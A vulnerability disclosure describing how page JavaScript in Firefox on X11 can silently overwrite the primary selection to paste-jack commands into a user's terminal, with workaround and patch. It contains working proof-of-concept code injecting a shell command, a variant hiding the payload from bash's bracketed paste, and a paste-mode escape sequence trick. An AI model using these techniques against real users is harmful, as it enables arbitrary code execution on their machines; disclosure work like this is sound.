In firefox running on X11, any script from any page can freely write to the
primary selection, and that can be easily exploited to run arbitrary code
on the user's machine.

No user interaction is necessary -- any page able to run javascript can do it,
including e.g. a page from a background tab of a minimized window, an iframe
inside such a window, an error page, a sandboxed iframe, a page that has
reloaded itself via `meta http-equiv=refresh`, etc.

This applies to all the versions of mozilla/firefox and their derivatives
(seamonkey, etc) that I was able to test, including the latest nightly.

### Example

The simplest example, which works in the default configurations of systems
like OpenBSD or Alpine Linux (= any Unix/Linux system where Wayland is not
the default and the default *shell* does not implement [bracketed-paste]),
would go like this:

Load the following snippet ([live example here][pastejack]) in firefox:

	<pre id=pre style=font-size:0></pre>
	intentionally left blank
	<script>
	function writeXPrimary(s){
		pre.textContent = s; getSelection().selectAllChildren(pre);
	}
	setInterval(function(){
		writeXPrimary('touch ~/LOL-' + Date.now() / 1000 +'\r')
	}, 500)
	</script>

Then pretend to forget about it, and go about your work. Sooner or later,
when trying to paste something in the terminal with shift-Insert or middle
click, you will end up running the command `writeXPrimary()` has injected
just between your copy and paste.

[pastejack]: https://turistu.github.io/firefox/pastejack.html
[bracketed-paste]: https://invisible-island.net/xterm/xterm-paste64.html

### Short technical explanation

Browsers like firefox have the concepts of "trusted context" (e.g. `https://`)
and "transient user activation"; the javascript from the page gets some
temporary powers as soon as you have interacted *even so little* with the
page, like clicked, touched it, etc.

For instance, writing with `Clipboard.writeText()` to the windows-style
Ctrl-C Ctrl-V *clipboard* selection is only possible from secure contexts
and while the transient activation is enabled. As this bug demonstrates,
no such prerequisites are needed for writing to the *primary* selection,
which on X11 is much more used and much more valuable.

[user activation]: https://developer.mozilla.org/en-US/docs/Web/Security/User_activation

### Workaround

Without patching firefox, the only workaround I can think about is
disabling the `Clipboard.selectAllChildren()` function from an addon's
content script, e.g. like this:

	let block = function(){ throw Error('blocked') };
	exportFunction(block, Selection.prototype, { defineAs: 'selectAllChildren' });

[Complete extension here][xpi]. I tried to submit it to addons.mozilla.org
but they didn't accept it. If you're running firefox-esr, the development
edition or nightly, you can just `set xpinstall.signatures.required` to true in
`about:config` and install it with `firefox no-sel.xpi`.

[xpi]: no-sel.xpi

### Firefox Patch
```
diff -r 9b362770f30b layout/generic/nsFrameSelection.cpp
--- a/layout/generic/nsFrameSelection.cpp	Fri Oct 06 12:03:17 2023 +0000
+++ b/layout/generic/nsFrameSelection.cpp	Sun Oct 08 11:04:41 2023 +0300
@@ -3345,6 +3345,10 @@
     return;  // Don't care if we are still dragging.
   }
 
+  if (aReason & nsISelectionListener::JS_REASON) {
+    return;
+  }
+
   if (!aDocument || aSelection.IsCollapsed()) {
 #ifdef DEBUG_CLIPBOARD
     fprintf(stderr, "CLIPBOARD: no selection/collapsed selection\n");
```

The idea of this patch was to *always* prevent javascript from indirectly
messing with the primary selection via the Selection API. However, it turned
out that the `JS_REASON` flag was not reliable; if javascript calls some
function like `addRange()` or `selectAllChildren()` while the user has started
dragging but hasn't released the mouse button yet, that code will be called
*without* that flag but with the text set by javascript, not the text
selected by the user. However, I think that this patch is still enough
to fill the glaring hole opened by `selectAllChildren()`.

### About that example and bracketed-paste

The bracketed paste feature of bash/readline and zsh means that you
cannot just append a CR or LF to the payload and be done, it's the
user who has to press ENTER for it to run.

However, workarounds exist.  For instance, some terminals like mlterm
don't filter out the pasted data, and you can terminate the pasting
mode early by inserting a `\e[201~` in the payload.

For bash, you can take advantage of some quirks in the readline library
to turn off the highlighting and make the payload invisible to the user.
E.g. ([live example here][bash-pastejack])

	let payload = 'touch ~/LOL-' + Date.now() / 1000;
	writeXPrimary('\n' + payload + '\n'.repeat(100) + ' '.repeat(30)
		+ '\n'.repeat(100))

which will confuse the user with a screen like when some background job
had written something to the terminal:

	user@host:~$ : previous unrelated command
	user@host:~$	<-- paste here
	#   <-- cursor here, most users will just hit Enter to get a new prompt

[bash-pastejack]:	https://turistu.github.io/firefox/bash-pastejack.html

Just to be clear, I don't think that either mlterm, bash, nor the shells that
don't do have that bracketed-paste feature are at fault here in any way
(and I personally always turn off that misfeature as it badly interferes
with my workflow): It's firefox which should get all the blame for letting
random javascript evade its pretended "sandbox" in this way.

### About wayland

For firefox running in Wayland, `writeXPrimary()` will only succeed
when the firefox window (the main window, not necessarily the tab the code
runs in) has the focus. Otherwise the selection will be cleared. At first I
assumed that this is something specific to the Wayland protocol, but that
turned out to be utterly false; it's just some quirk, bug or "feature"
specific to either firefox itself or GTK.

But I think that's still bad enough, even if the page should take care to
only set the selection when the main window has gained focus.

And of course, all this doesn't affect the situation where you're copying
and pasting in another firefox tab with a different context, origin, etc;
and all the other situations where you don't appreciate having random
javascript you don't even know about messing with your copy & paste.